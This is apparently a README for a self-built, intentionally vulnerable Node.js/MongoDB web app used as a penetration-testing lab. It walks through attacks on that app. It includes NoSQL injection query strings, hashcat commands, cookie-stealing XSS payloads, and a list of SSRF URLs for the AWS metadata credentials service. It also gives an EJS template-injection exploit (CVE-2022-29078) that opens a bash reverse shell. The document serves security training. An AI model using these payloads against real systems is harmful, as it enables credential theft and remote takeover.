<h2> pentesting app</h2>
Setting Up a Penetration Testing Site and Conducting a Penetration Test - 2022.11


## Table of contents
- [1) Introduction](#1-introduction)
- [2) Features](#2-features)
- [3) Getting started](#3-getting-started)

<br/>

### 1) Introduction
### page
---

join / login / image_viewer / board / user (hidden) / admin 

![page-intro](images/page.gif)

<br />

### penetration test
---
#### NoSQL Injection
<figure>
<img src="images/users.png" style="width:100%">
<figcaption>user-list</figcaption>
</figure>

<figure>
<img src="images/admin.png" style="width:100%">
<figcaption>/user/[username]</figcaption>
</figure>

```url
# not equals
/users/admin?upw[$ne]=1 # check account

# regular express
/users/admin?upw[$regex]=.{32} # find the length of a value

# blind sql injection
/users/admin?upw[$regex]=^1 # brute-force 
```

```bash
hash-identifier [hash-value]
hashcat -a 0 -m 0 /usr/share/wordlists
```

<br />

#### XSS
```html
<!-- 
GET /?content
POST /posts
-->
<script>alert(document.cookie);</script>
<img src="#" onerror="alert(document.cookie)" >
..
..
```

<br />

#### SSRF
aws server : 169.254.169.254
<figure>
<img src="images/aws-encoding.png" style="width:100%">
<figcaption>http://169.254.169.254/latest/meta-data</figcaption>
</figure>

<figure>
<img src="images/aws-decoding2.png" style="width:100%">
<figcaption>base64 decoding</figcaption>
</figure>

<figure>
<img src="images/aws-decoding.png" style="width:100%">
<figcaption>http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance : aws access key</figcaption>
</figure>

<br />

```url
# image_viewer function : http communication
# aws metadata URLs
http://169.254.169.254/user-data
http://169.254.169.254/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/meta-data
http://169.254.169.254/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/meta-data/ami-id
http://169.254.169.254/meta-data/reservation-id
http://169.254.169.254/meta-data/hostname
http://169.254.169.254/dynamic/instance-identity/document
```

<br />

#### SSTI
EJS RCE : CVE-2022-29078

```bash
/?settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync(%22/bin/bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/127.0.0.1/1337%200%3E%261%27%22);s
```

<br />

<figure>
<img src="images/reverse-shell.png" style="width:100%">
<figcaption>reverse-shell</figcaption>
</figure>


<br/>


### 2) Features
- aws
- mongodb
- nodejs & express
- ejs
- nosql injection
- xss
- ssti
- ssrf

<br/>

### 3) Getting started
1. Building an https server : Create a key.pem, cert.pem file under the key folder

2. Create an administrator account in db : admin/[passwd]


```bash 
npm install
brew services start mongodb-community@latest
npm start
```
